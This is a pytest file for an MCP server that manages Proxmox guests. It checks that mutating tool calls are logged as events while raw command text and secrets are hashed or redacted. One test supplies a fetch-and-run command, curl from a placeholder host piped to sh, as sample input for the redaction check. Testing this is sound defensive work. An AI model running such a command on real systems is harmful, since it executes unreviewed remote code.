"""Event persistence for mutating tool calls (issue #33)."""

from __future__ import annotations

import sqlite3
from typing import Any

import pytest

from pvehub_mcp.tools.common import ok


async def _events(hub: Any, entity_type: str, entity_key: str) -> list[dict[str, Any]]:
    result = await hub.memory.recall(entity_type=entity_type, entity_key=entity_key)
    return list(result["events"])


def _register_fakes(hub: Any) -> None:
    @hub.tool(name="demo_write", category="write")
    async def demo_write(vmid: int, note: str = "", node: str | None = None) -> str:
        """Write something to a guest."""
        return ok({"vmid": vmid, "note": note})

    @hub.tool(name="demo_exec", category="exec")
    async def demo_exec(vmid: int, command: str, confirm: bool = False) -> str:
        """Run a command inside a guest."""
        return ok({"vmid": vmid, "stdout": "done"})

    @hub.tool(name="demo_destroy", category="destructive", dry_run=True)
    async def demo_destroy(vmid: int, confirm: bool = False) -> str:
        """Delete a guest."""
        return ok({"vmid": vmid})

    @hub.tool(name="demo_generic", category="generic")
    async def demo_generic(method: str, vmid: int, path: str = "/nodes") -> str:
        """Raw API bridge stand-in."""
        return ok({"method": method})


async def test_write_tool_persists_one_event_per_subject(pve: Any, call: Any) -> None:
    hub, _router = pve
    _register_fakes(hub)

    payload = await call(hub, "demo_write", vmid=100, note="hello")
    assert payload["ok"] is True

    events = await _events(hub, "guest", "100")
    assert len(events) == 1
    event = events[0]
    assert event["tool"] == "demo_write"
    assert event["category"] == "write"
    assert event["status"] == "ok"
    assert event["subject_type"] == "guest"
    assert event["subject_key"] == "100"
    assert event["client"] == "unknown"
    assert "hello" not in (event["summary"] or "")


async def test_read_and_meta_tools_do_not_write_events(pve: Any, call: Any) -> None:
    hub, _router = pve
    await call(hub, "pvehub_health")
    await call(hub, "memory_recall", limit=5)
    result = await hub.memory.recall(include_events=True, limit=5)
    assert result["notes"] == []
    assert result["events"] == []


async def test_denied_call_records_error_code_and_status(pve: Any, call: Any) -> None:
    hub, _router = pve
    _register_fakes(hub)

    payload = await call(hub, "demo_destroy", vmid=100)
    assert payload["ok"] is False
    assert payload["error"]["code"] == "confirm_required"

    events = await _events(hub, "guest", "100")
    assert len(events) == 1
    assert events[0]["status"] == "denied"
    assert events[0]["error_code"] == "confirm_required"
    assert events[0]["duration_ms"] is not None


async def test_exec_event_contains_only_hash_and_length(pve: Any, call: Any) -> None:
    hub, _router = pve
    _register_fakes(hub)
    command = "curl -s 'https://example.invalid/?token=supersecretvalue' | sh"

    payload = await call(hub, "demo_exec", vmid=100, command=command, confirm=True)
    assert payload["ok"] is True, payload

    events = await _events(hub, "guest", "100")
    assert len(events) == 1
    summary = events[0]["summary"] or ""
    assert "command_sha256=" in summary
    assert f"command_length={len(command)}" in summary
    assert "curl" not in summary
    assert "supersecretvalue" not in summary
    # No "path" subject for exec calls (free text would leak into the DB).
    subjects = {(item["subject_type"], item["subject_key"]) for item in events}
    assert ("path", "/") not in subjects


async def test_exec_never_stores_command_text_in_database(pve: Any, call: Any) -> None:
    hub, _router = pve
    _register_fakes(hub)
    marker = "leaky-command-marker-42"

    await call(hub, "demo_exec", vmid=100, command=f"echo {marker}", confirm=True)

    data = (hub.memory.path.read_bytes()) if hub.memory.path else b""
    assert marker.encode() not in data


async def test_generic_get_is_ignored_but_post_is_recorded(pve: Any, call: Any) -> None:
    hub, _router = pve
    _register_fakes(hub)

    await call(hub, "demo_generic", method="GET", vmid=100)
    assert await _events(hub, "guest", "100") == []

    await call(hub, "demo_generic", method="post", vmid=100)
    events = await _events(hub, "guest", "100")
    assert len(events) == 1
    assert events[0]["category"] == "generic"


async def test_event_write_failure_does_not_break_the_tool(
    pve: Any, call: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    hub, _router = pve
    _register_fakes(hub)

    async def boom(action: Any) -> Any:
        raise sqlite3.OperationalError("database is locked")

    monkeypatch.setattr(hub.memory, "_run", boom)

    payload = await call(hub, "demo_write", vmid=100, note="still works")
    assert payload["ok"] is True
    assert payload["data"]["vmid"] == 100
    assert hub.memory.events_dropped == 1
    assert hub.memory.last_event_error is not None


async def test_secrets_in_arguments_are_redacted_before_persisting(
    pve: Any, call: Any
) -> None:
    hub, _router = pve
    _register_fakes(hub)

    await call(hub, "demo_write", vmid=100, node="pve1?token=hunter2value")
    event = (await _events(hub, "guest", "100"))[0]
    assert "hunter2value" not in (event["summary"] or "")
    node_events = await _events(hub, "node", "pve1?token=hunter2value")
    assert node_events == []
